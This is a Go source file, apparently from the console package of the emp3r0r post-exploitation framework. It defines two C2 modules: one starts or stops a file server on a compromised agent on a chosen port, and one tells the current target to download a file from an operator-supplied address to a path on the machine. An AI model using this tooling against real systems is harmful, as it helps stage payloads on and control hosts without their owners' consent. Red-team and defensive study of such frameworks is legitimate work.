package cc

import (
	"fmt"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

func moduleFileServer() {
	switchOpt, ok := AvailableModuleOptions["switch"]
	if !ok {
		LogError("Option 'switch' not found")
		return
	}
	server_switch := switchOpt.Val

	portOpt, ok := AvailableModuleOptions["port"]
	if !ok {
		LogError("Option 'port' not found")
		return
	}
	cmd := fmt.Sprintf("%s --port %s --switch %s", emp3r0r_def.C2CmdFileServer, portOpt.Val, server_switch)
	err := SendCmd(cmd, "", ActiveAgent)
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
	LogInfo("File server (port %s) is now %s", portOpt.Val, server_switch)
}

func moduleDownloader() {
	requiredOptions := []string{"download_addr", "checksum", "path"}
	for _, opt := range requiredOptions {
		if _, ok := AvailableModuleOptions[opt]; !ok {
			LogError("Option '%s' not found", opt)
			return
		}
	}

	download_addr := AvailableModuleOptions["download_addr"].Val
	checksum := AvailableModuleOptions["checksum"].Val
	path := AvailableModuleOptions["path"].Val

	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", emp3r0r_def.C2CmdFileDownloader, download_addr, checksum, path)
	err := SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
}
